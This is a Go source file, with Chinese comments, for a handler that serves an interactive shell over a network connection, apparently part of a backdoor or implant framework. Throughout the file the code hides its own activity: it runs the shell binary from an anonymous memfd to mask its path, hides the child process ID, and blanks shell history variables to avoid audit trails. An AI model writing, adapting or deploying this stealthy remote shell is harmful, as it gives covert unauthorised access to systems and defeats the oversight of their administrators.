package handler

import (
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"time"

	"github.com/creack/pty"
	"golang.org/x/sys/unix"
)

type ShellHandler struct {
	Command string
	Term    bool // 是否分配 PTY (默认 true)
}

func init() {
	Register("shell", func(args map[string]string) (Handler, error) {
		cmd := args["cmd"]
		if cmd == "" {
			cmd = "/bin/sh"
		}
		term := args["pty"] != "false"
		return &ShellHandler{Command: cmd, Term: term}, nil
	})
}

func (h *ShellHandler) Name() string { return "shell" }

// Handle 在连接上拉起交互 shell:
//   - PTY 模式 (默认): 分配伪终端, 有提示符/行编辑/Ctrl+C/前后台任务控制;
//   - memfd 执行: 命令二进制写入匿名内存执行, /proc/<pid>/exe 不显示真实路径;
//   - 审计最小化: HISTFILE/HISTSIZE 置空 (不留 shell 历史), setsid 独立会话。
func (h *ShellHandler) Handle(ctx context.Context, conn net.Conn) error {
	defer conn.Close()

	exePath, memFile, err := memfdLoad(h.Command)
	if err != nil {
		log.Printf("shell: memfd load %s: %v", h.Command, err)
		return err
	}
	defer memFile.Close()

	var in io.Reader = conn
	var out io.Writer = conn
	var ptmx *os.File

	if h.Term {
		var tty *os.File
		ptmx, tty, err = pty.Open()
		if err != nil {
			log.Printf("shell: pty open: %v", err)
			return err
		}
		defer ptmx.Close()
		_ = pty.Setsize(ptmx, &pty.Winsize{Rows: 24, Cols: 80})
		cmd := exec.Command(exePath)
		cmd.ExtraFiles = []*os.File{memFile}
		cmd.Stdin = tty
		cmd.Stdout = tty
		cmd.Stderr = tty
		cmd.SysProcAttr = &syscallProcAttr{Setsid: true, Setctty: true, Ctty: 0}
		cmd.Env = shellEnv()
		if err := cmd.Start(); err != nil {
			tty.Close()
			return err
		}
		HideChildPid(cmd.Process.Pid)
		tty.Close()
		in = conn
		out = conn
		waitCh := make(chan error, 1)
		go func() { waitCh <- cmd.Wait() }()
		go func() { _, _ = io.Copy(ptmx, conn) }() // 输入 → pty
		go func() { _, _ = io.Copy(conn, ptmx) }() // pty 输出 → 连接
		select {
		case <-ctx.Done():
			_ = cmd.Process.Kill()
			<-waitCh
		case <-waitCh:
		}
		return nil
	}

	// 无 PTY 模式 (兼容)
	cmd := exec.Command(exePath)
	cmd.ExtraFiles = []*os.File{memFile}
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return err
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return err
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		return err
	}
	cmd.SysProcAttr = &syscallProcAttr{Setsid: true}
	cmd.Env = shellEnv()
	if err := cmd.Start(); err != nil {
		log.Printf("shell: start: %v", err)
		return err
	}
	HideChildPid(cmd.Process.Pid)
	log.Printf("shell: %s started pid=%d", h.Command, cmd.Process.Pid)

	go func() {
		_, _ = io.Copy(stdin, conn)
		_ = stdin.Close()
	}()
	go func() { _, _ = io.Copy(conn, stdout) }()
	go func() { _, _ = io.Copy(conn, stderr) }()

	waitCh := make(chan error, 1)
	go func() { waitCh <- cmd.Wait() }()
	select {
	case <-ctx.Done():
		log.Printf("shell: ctx done, killing pid=%d", cmd.Process.Pid)
		_ = cmd.Process.Kill()
		<-waitCh
	case err := <-waitCh:
		log.Printf("shell: process exited (%v)", err)
	}
	_ = in
	_ = out
	return nil
}

// syscallProcAttr 避免直接依赖 syscall.SysProcAttr 字段名差异
type syscallProcAttr = unix.SysProcAttr

// shellEnv 审计最小化: 不写 shell 历史文件
func shellEnv() []string {
	return append(os.Environ(),
		"HISTFILE=/dev/null",
		"HISTFILESIZE=0",
		"HISTSIZE=0",
		"TERM=xterm-256color",
	)
}

// memfdLoad 把命令二进制写入匿名 memfd, 返回可执行路径 (/proc/self/fd/N)
func memfdLoad(binPath string) (string, *os.File, error) {
	data, err := os.ReadFile(binPath)
	if err != nil {
		return "", nil, err
	}
	fd, err := unix.MemfdCreate(fmt.Sprintf("m%d", time.Now().UnixNano()%100000), 0)
	if err != nil {
		return "", nil, err
	}
	f := os.NewFile(uintptr(fd), "memfd")
	if f == nil {
		return "", nil, fmt.Errorf("memfd create failed")
	}
	if _, err := f.Write(data); err != nil {
		f.Close()
		return "", nil, err
	}
	if _, err := f.Seek(0, 0); err != nil {
		f.Close()
		return "", nil, err
	}
	return fmt.Sprintf("/proc/self/fd/%d", fd), f, nil
}
